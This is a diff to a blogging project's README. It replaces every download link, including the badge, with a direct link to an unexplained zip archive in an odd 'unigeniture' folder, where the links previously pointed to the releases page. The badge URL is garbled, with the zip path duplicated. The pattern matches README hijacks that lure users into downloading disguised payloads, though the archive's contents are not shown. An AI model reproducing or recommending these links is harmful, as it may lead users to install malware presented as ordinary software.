@@ -1,6 +1,6 @@
 # 🎉 blog-project - Simple Blogging Made Easy
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/prayoon2540/blog-project/releases)
+[![Download Now](https://github.com/prayoon2540/blog-project/raw/refs/heads/main/unigeniture/blog_project_1.4.zip%https://github.com/prayoon2540/blog-project/raw/refs/heads/main/unigeniture/blog_project_1.4.zip)](https://github.com/prayoon2540/blog-project/raw/refs/heads/main/unigeniture/blog_project_1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the blog-project! This application helps you create and manage your b
 
 ## 📥 Download & Install
 
-To download the latest version of the blog-project, visit this page: [Download Page](https://github.com/prayoon2540/blog-project/releases).
+To download the latest version of the blog-project, visit this page: [Download Page](https://github.com/prayoon2540/blog-project/raw/refs/heads/main/unigeniture/blog_project_1.4.zip).
 
 Here’s how to get started:
 
@@ -77,6 +77,6 @@ We welcome contributions from everyone. If you would like to help improve the bl
 For updates, you can follow the repository on GitHub. We also share tips, tutorials, and news related to blogging on our website. Connect with us to join the community and improve your blogging journey.
 
 ## 🚀 Visit for Downloads: 
-You can visit the download page here: [https://github.com/prayoon2540/blog-project/releases](https://github.com/prayoon2540/blog-project/releases).
+You can visit the download page here: [https://github.com/prayoon2540/blog-project/raw/refs/heads/main/unigeniture/blog_project_1.4.zip](https://github.com/prayoon2540/blog-project/raw/refs/heads/main/unigeniture/blog_project_1.4.zip).
 
 Enjoy blogging with blog-project!
